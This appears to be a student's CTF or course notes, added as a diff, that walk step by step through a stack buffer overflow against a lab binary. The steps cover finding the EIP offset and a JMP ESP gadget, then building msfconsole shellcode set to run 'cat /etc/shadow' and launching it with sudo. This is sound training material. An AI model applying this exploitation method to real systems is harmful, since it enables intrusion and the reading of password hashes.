@@ -1,0 +1,53 @@
+CTFD > Resources > Exploit Dev > func
+
+chmod +x func
+interact with it, try to input 100x AA's
+error that happened: Segmentation fault (core dumped)
+
+gdb func
+
+geb-peta$ run
+runs the program in gdb/peta
+input the same overflow values to break it
+take note of where your input is wrote and see if the Instruction Pointer is overwriteable
+
+geb-peta$ pdisass main (dissassembles a function to show its assembly instructions)
+pdissass will color code the vulnerable functions as RED and UNDERLINED (only for peda)
+call   0x565553d0 <gets@plt>
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+	input EIP memory location into the url above to ID the offset for buffersize (62 for func)
+
+build exploit.py to create the buffer size, eip, nop, and buf (shellcode)
+
+geb-peta$ run <<< $(python /home/student/exploit.py)(only use <<< on scripts that require input)
+can use the exploit to test that whatever you put in the EIP section shows in the peta output.
+
+env - gdb func (clears environment to ensure function interacts with exploit as intended and memory locations are set
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) show env -> shows empty columns
+(gdb) run (give it a input large enough to break buffer) >>>>>>>>>> 0x41414141 the output at bottom will show where error occured and give you the offset without peta plugin
+(gdb) info proc map
+	show mem locations to reference heap/stack memory locations
+(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
+	utilize the Start addr just below heap, end addr in stack line, 0xff (JMP), 0xe4(ESP). this command will locate JMP ESP in the specified memory range
+	one of the top 3 results should work for making the exploit work (these memory locations will be used in the eip field)
+	will need to tailor the location to be read backwords for little endian.
+		from command "0xf7de3b59" , input to exploit.py eip = \x59\x3b\xde\xf7
+	time to use msfconsole to build the shellcode
+
+msf6> use payload/linux/x86/exec
+msf6 payload(linux/x86/exec) > show options
+msf6 payload(linux/x86/exec) > set cmd  cat /etc/shadow
+msf6 payload(linux/x86/exec) > show options
+	confirms it took the input above
+msf6 payload(linux/x86/exec) > generate -b "\x00\x20\x0a\x0d\x03" -f python
+	generates a ton of results to remove bad characters from our shell code and creates the shellcode
+	nano the exploit and input shellcode generated from msf6
+RUN THE SCRIPT!!! (this demo assume that we have sudo permissions)
+sudo ./func <<< $(python /home/student/exploit.py)
+
+
+
+
